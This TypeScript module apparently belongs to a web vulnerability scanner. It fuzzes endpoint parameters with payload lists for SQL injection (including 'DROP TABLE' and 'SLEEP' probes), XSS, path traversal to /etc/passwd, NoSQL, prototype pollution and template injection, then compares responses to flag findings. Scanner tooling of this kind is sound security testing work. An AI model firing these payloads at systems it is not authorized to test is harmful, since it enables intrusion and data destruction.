/**
 * ParameterFuzzer — Automated parameter discovery and fuzzing engine.
 *
 * Extracts query, path, and body parameters from endpoints, generates
 * targeted payload variations, and sends fuzz requests to detect
 * anomalies and vulnerabilities.
 *
 * Limits: Max 20 fuzz attempts per endpoint, max 10 payload variations per param.
 * Rate-limited via JobDispatcher.
 * Security: No arbitrary code execution. Bounded processing. Timeout-safe.
 */
import { AttackNode, ScanSession, FindingType } from '../../types';
import { httpRequest, maybeAddFinding, calculateDiff, detectors } from '../../utils/scanUtils';
import { logger } from '../../utils/logger';

const log = logger.child({ module: 'ParameterFuzzer' });

// ─── Constants ──────────────────────────────────────────────────────────────

const MAX_FUZZ_ATTEMPTS_PER_ENDPOINT = 20;
const MAX_PAYLOAD_VARIATIONS = 10;
const MAX_PARAMS_PER_ENDPOINT = 10;

// ─── Types ──────────────────────────────────────────────────────────────────

export interface FuzzResult {
    endpointsProcessed: number;
    parametersFuzzed: number;
    totalAttempts: number;
    findingsGenerated: number;
    durationMs: number;
}

interface ExtractedParam {
    name: string;
    source: 'query' | 'path' | 'body';
    sampleValue?: string;
}

/**
 * Context types for payload generation.
 * Helps generate payloads appropriate for different contexts.
 */
type PayloadContext = 'sql' | 'json' | 'html' | 'graphql' | 'unknown';

// ─── Fuzz Payloads ──────────────────────────────────────────────────────────

/** Payload sets keyed by the type of vulnerability they target */
const FUZZ_PAYLOADS: Record<string, string[]> = {
    sqli: [
        "'", "''", "' OR '1'='1", "1' AND '1'='1", "' UNION SELECT NULL--",
        "' AND SLEEP(2)--", "1; DROP TABLE test--",
    ],
    xss: [
        '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
        "';alert(1);//", '<svg/onload=alert(1)>', '{{7*7}}',
    ],
    traversal: [
        '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
        '....//....//etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
    overflow: [
        'A'.repeat(1000), 'A'.repeat(5000), '-1', '0', '99999999',
        '0x41414141', String(Number.MAX_SAFE_INTEGER),
    ],
    format: [
        '%s%s%s%s%s', '%x%x%x%x', '%n', '{0}', '${7*7}',
    ],
    special: [
        '', ' ', 'null', 'undefined', 'true', 'false',
        '[]', '{}', 'NaN', 'Infinity',
    ],
};

/**
 * Advanced mutation strategies for parameter fuzzing.
 * These mutations target different injection techniques.
 */
const ADVANCED_MUTATIONS: Record<string, string[]> = {
    // Nested JSON injection
    json_nested: [
        '{"$gt":""}', '{"$gt":null}', '{"$ne":null}', '{"$where":"1==1"}',
        '[{"$gt":""}]', '{"x":{"y":{"z":""}}}',
    ],
    // Array parameter injection
    array_injection: [
        '[]', '[1]', '[1,2,3]', '["a","b","c"]', '[null]',
    ],
    // Boolean coercion
    boolean_coercion: [
        'true', 'false', 'True', 'False', 'TRUE', 'FALSE', '1', '0',
    ],
    // Object injection
    object_injection: [
        '{}', '{"a":"b"}', '__proto__', 'constructor', 'prototype',
        '{"__proto__":{"x":"y"}}',
    ],
    // Null injection
    null_injection: [
        'null', 'NULL', 'Null', 'nil', 'none', 'undefined', 'UNDEFINED',
    ],
    // Unicode and encoding
    unicode_encoding: [
        '\\u0027', '\\u003c', '\\u003e', '\\u0022', '\\x27', '\\x3c',
        '%u0027', '%u003c',
    ],
    // Double URL encoding
    double_url_encoding: [
        '%252e%252e%252fetc%252fpasswd', '%2527', '%253c%253e',
        '%252f%252f', '%252e%252e%252f',
    ],
};

/**
 * NoSQL injection payloads
 */
const NOSQLI_PAYLOADS = [
    '{"$gt":""}', '{"$gte":""}', '{"$lt":""}', '{"$lte":""}',
    '{"$eq":""}', '{"$ne":""}', '{"$in":[]}', '{"$nin":[]}',
    '{"$and":[]}', '{"$or":[]}', '{"$not":{"x":1}}',
];

/**
 * GraphQL-specific payloads
 */
const GRAPHQL_PAYLOADS = [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{...{...{...{...{...{}}}}}","variables":{}}',
    '"or":true',
];

/** Param name patterns that suggest specific vulnerability types */
const PARAM_VULN_HINTS: Array<{ pattern: RegExp; types: string[] }> = [
    { pattern: /^(id|uid|user_?id|account_?id|order_?id|item_?id|pid)$/i, types: ['sqli', 'overflow'] },
    { pattern: /^(search|query|q|s|keyword|filter|term)$/i, types: ['sqli', 'xss'] },
    { pattern: /^(name|title|comment|message|body|text|content|desc)$/i, types: ['xss', 'sqli'] },
    { pattern: /^(file|path|page|dir|folder|doc|template)$/i, types: ['traversal'] },
    { pattern: /^(url|redirect|next|callback|return|goto|dest|target|uri|href|link)$/i, types: ['xss', 'traversal'] },
    { pattern: /^(email|username|login|user|pass|password)$/i, types: ['sqli', 'xss'] },
    { pattern: /^(sort|order|column|field|by|group)$/i, types: ['sqli'] },
    { pattern: /^(limit|offset|page|size|count|num|number)$/i, types: ['overflow', 'sqli'] },
    { pattern: /^(format|type|output|render|view|layout)$/i, types: ['format', 'xss'] },
    { pattern: /^(cmd|exec|command|run|shell|action)$/i, types: ['sqli', 'xss', 'format'] },
];

// ─── Engine ─────────────────────────────────────────────────────────────────

export class ParameterFuzzer {
    /**
     * Fuzz all eligible endpoints in the session.
     * Extracts parameters, generates targeted payloads, and detects anomalies.
     */
    async fuzz(session: ScanSession, endpoints: AttackNode[]): Promise<FuzzResult> {
        const start = Date.now();
        let totalAttempts = 0;
        let parametersFuzzed = 0;
        let findingsGenerated = 0;
        let endpointsProcessed = 0;

        for (const endpoint of endpoints) {
            const params = this.extractParams(endpoint);
            if (params.length === 0) continue;

            endpointsProcessed++;
            let attemptCount = 0;

            // Get baseline for comparison
            const baseline = await httpRequest(session, endpoint.url, endpoint.authContext || 'userA');

            for (const param of params) {
                if (attemptCount >= MAX_FUZZ_ATTEMPTS_PER_ENDPOINT) break;

                const payloads = this.generatePayloads(param);
                parametersFuzzed++;

                for (const payload of payloads) {
                    if (attemptCount >= MAX_FUZZ_ATTEMPTS_PER_ENDPOINT) break;
                    attemptCount++;
                    totalAttempts++;

                    try {
                        const fuzzUrl = this.buildFuzzUrl(endpoint.url, param, payload);
                        const res = await httpRequest(session, fuzzUrl, endpoint.authContext || 'userA');

                        const finding = this.analyzeResponse(baseline, res, param, payload, fuzzUrl);
                        if (finding) {
                            await maybeAddFinding(session, finding);
                            findingsGenerated++;
                            break; // One finding per param is enough
                        }
                    } catch {
                        // Skip failed requests silently
                    }
                }
            }
        }

        const durationMs = Date.now() - start;
        log.info('Parameter fuzzing complete', {
            endpointsProcessed,
            parametersFuzzed,
            totalAttempts,
            findingsGenerated,
            durationMs,
        });

        return { endpointsProcessed, parametersFuzzed, totalAttempts, findingsGenerated, durationMs };
    }

    /**
     * Extract parameters from an endpoint (query params from URL + declared params).
     * Limits to MAX_PARAMS_PER_ENDPOINT to avoid excessive fuzzing.
     */
    private extractParams(endpoint: AttackNode): ExtractedParam[] {
        const params: ExtractedParam[] = [];
        const seen = new Set<string>();

        // From declared params on the attack node
        for (const p of endpoint.params ?? []) {
            if (!seen.has(p) && params.length < MAX_PARAMS_PER_ENDPOINT) {
                seen.add(p);
                params.push({ name: p, source: 'query' });
            }
        }

        // From URL query string
        try {
            const url = new URL(endpoint.url);
            for (const [key, value] of url.searchParams) {
                if (!seen.has(key) && params.length < MAX_PARAMS_PER_ENDPOINT) {
                    seen.add(key);
                    params.push({ name: key, source: 'query', sampleValue: value });
                }
            }
        } catch {
            // Invalid URL — skip
        }

        // Detect path parameters (numeric segments)
        try {
            const url = new URL(endpoint.url);
            const segments = url.pathname.split('/').filter(Boolean);
            for (let i = 0; i < segments.length && params.length < MAX_PARAMS_PER_ENDPOINT; i++) {
                if (/^\d+$/.test(segments[i])) {
                    const name = `_path_${i}`;
                    if (!seen.has(name)) {
                        seen.add(name);
                        params.push({ name, source: 'path', sampleValue: segments[i] });
                    }
                }
            }
        } catch {
            // Invalid URL — skip
        }

        return params;
    }

    /**
     * Generate targeted payloads for a specific parameter based on its name and context.
     * Includes advanced mutation strategies (JSON, array, boolean, object, null, unicode, double encoding).
     */
    private generatePayloads(param: ExtractedParam): string[] {
        const payloads: string[] = [];
        const targetTypes = new Set<string>();

        // Match param name to vulnerability types
        for (const hint of PARAM_VULN_HINTS) {
            if (hint.pattern.test(param.name)) {
                for (const t of hint.types) targetTypes.add(t);
            }
        }

        // Default: try sqli + xss + special for unknown params
        if (targetTypes.size === 0) {
            targetTypes.add('sqli');
            targetTypes.add('xss');
            targetTypes.add('special');
        }

        // Add base payloads
        for (const type of targetTypes) {
            const typePayloads = FUZZ_PAYLOADS[type];
            if (typePayloads) {
                payloads.push(...typePayloads);
            }
        }

        // Detect context and add advanced mutations
        const context = this.detectContext(param);
        if (context === 'json' || context === 'unknown') {
            payloads.push(...ADVANCED_MUTATIONS.json_nested);
            payloads.push(...ADVANCED_MUTATIONS.array_injection);
            payloads.push(...ADVANCED_MUTATIONS.object_injection);
            payloads.push(...NOSQLI_PAYLOADS);
        }

        if (context === 'graphql') {
            payloads.push(...GRAPHQL_PAYLOADS);
        }

        // Always add encoding mutations
        payloads.push(...ADVANCED_MUTATIONS.unicode_encoding);
        payloads.push(...ADVANCED_MUTATIONS.double_url_encoding);

        // Add boolean and null coercion
        payloads.push(...ADVANCED_MUTATIONS.boolean_coercion);
        payloads.push(...ADVANCED_MUTATIONS.null_injection);

        // Deduplicate and limit
        return [...new Set(payloads)].slice(0, MAX_PAYLOAD_VARIATIONS);
    }

    /**
     * Detect the context of a parameter (SQL, JSON, HTML, GraphQL, or unknown).
     * Used to tailor payload generation to the expected context.
     */
    private detectContext(param: ExtractedParam): PayloadContext {
        const name = param.name.toLowerCase();

        // SQL context hints
        if (/sql|query|where|filter|search|id|uid|order|sort|column|limit/i.test(name)) {
            return 'sql';
        }

        // JSON context hints
        if (/json|data|payload|body|params|config|settings|metadata|options/i.test(name)) {
            return 'json';
        }

        // GraphQL context hints
        if (/query|graphql|gql|schema|field|type/i.test(name)) {
            return 'graphql';
        }

        // HTML context hints
        if (/html|template|render|view|page|content|text|message|title|description/i.test(name)) {
            return 'html';
        }

        return 'unknown';
    }

    /**
     * Build a URL with the fuzz payload injected into the target parameter.
     */
    private buildFuzzUrl(baseUrl: string, param: ExtractedParam, payload: string): string {
        if (param.source === 'path' && param.sampleValue) {
            // Replace the path segment
            return baseUrl.replace(param.sampleValue, encodeURIComponent(payload));
        }

        // Query parameter injection
        try {
            const url = new URL(baseUrl);
            url.searchParams.set(param.name, payload);
            return url.toString();
        } catch {
            // Fallback: append as query param
            const separator = baseUrl.includes('?') ? '&' : '?';
            return `${baseUrl}${separator}${encodeURIComponent(param.name)}=${encodeURIComponent(payload)}`;
        }
    }

    /**
     * Analyze fuzz response against baseline to detect anomalies.
     */
    private analyzeResponse(
        baseline: { status: number; bodySnippet: string; length: number; timeMs: number },
        response: { status: number; bodySnippet: string; length: number; timeMs: number },
        param: ExtractedParam,
        payload: string,
        fuzzUrl: string,
    ): Omit<import('../../types').ScanFinding, 'id' | 'classification'> | null {
        const diff = calculateDiff(baseline.bodySnippet, response.bodySnippet);
        const timeDelta = response.timeMs - baseline.timeMs;

        // SQL error signatures
        if (detectors.sqlError(response.bodySnippet)) {
            return {
                type: 'sqli' as FindingType,
                url: fuzzUrl,
                severity: response.status >= 500 ? 'high' : 'medium',
                evidence: `SQL error triggered by fuzzing param "${param.name}" with payload: ${payload.slice(0, 80)}`,
            };
        }

        // XSS reflection (check if payload appears unencoded)
        const marker = payload.replace(/[<>"']/g, '');
        if (marker.length > 4 && response.bodySnippet.includes(marker) && payload.includes('<')) {
            if (detectors.reflectedXss(response.bodySnippet, marker)) {
                return {
                    type: 'xss' as FindingType,
                    url: fuzzUrl,
                    severity: 'medium',
                    evidence: `XSS reflection detected by fuzzing param "${param.name}" with payload: ${payload.slice(0, 80)}`,
                };
            }
        }

        // Template error (SSTI)
        if (detectors.templateError(response.bodySnippet) && payload.includes('{{')) {
            return {
                type: 'ssti' as FindingType,
                url: fuzzUrl,
                severity: 'high',
                evidence: `Template error triggered by fuzzing param "${param.name}" with payload: ${payload.slice(0, 80)}`,
            };
        }

        // Server error from benign-looking payload (anomaly)
        if (response.status >= 500 && baseline.status < 500) {
            return {
                type: 'anomaly' as FindingType,
                url: fuzzUrl,
                severity: 'low',
                evidence: `Server error (${response.status}) triggered by fuzzing param "${param.name}" with payload: ${payload.slice(0, 80)}`,
            };
        }

        // Time-based anomaly (>2.5s delta with time-based payload)
        if (timeDelta > 2500 && (payload.includes('SLEEP') || payload.includes('DELAY'))) {
            return {
                type: 'sqli' as FindingType,
                url: fuzzUrl,
                severity: 'high',
                evidence: `Time-based anomaly (${timeDelta}ms delta) on param "${param.name}" with payload: ${payload.slice(0, 80)}`,
                metrics: { timeDelta },
            };
        }

        // Config/secret leak
        if (detectors.configLeak(response.bodySnippet) && !detectors.configLeak(baseline.bodySnippet)) {
            return {
                type: 'config' as FindingType,
                url: fuzzUrl,
                severity: 'medium',
                evidence: `Config leak triggered by fuzzing param "${param.name}" with payload: ${payload.slice(0, 80)}`,
            };
        }

        return null;
    }
}
